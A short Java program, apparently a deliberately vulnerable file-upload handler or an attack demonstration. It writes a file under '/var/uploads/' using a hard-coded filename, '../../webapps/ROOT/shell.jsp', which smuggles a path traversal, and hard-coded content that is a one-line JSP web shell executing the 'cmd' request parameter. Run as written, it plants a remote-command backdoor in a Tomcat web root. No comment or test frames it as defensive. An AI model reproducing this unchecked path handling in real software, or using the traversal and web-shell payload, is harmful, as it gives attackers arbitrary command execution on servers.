import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.nio.charset.Charset;

public class UploadHandler {
    public static void main(String[] args) throws IOException {
      
        Map<String, String> requestParams = new HashMap<>();
        requestParams.put("filename", "../../webapps/ROOT/shell.jsp");
        requestParams.put("content", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>");
        
        String uploadedName = requestParams.get("filename");
        String fileContent = requestParams.get("content");
        String uploadDirectory = "/var/uploads/";
        String destinationPath = uploadDirectory + uploadedName;
        
        FileOutputStream fos = new FileOutputStream(destinationPath);
        OutputStreamWriter writer = new OutputStreamWriter(fos, Charset.forName("UTF-8"));
        
        writer.write(fileContent);
        writer.close();
        
        System.out.println("Fichier enregistré : " + destinationPath);
    }
}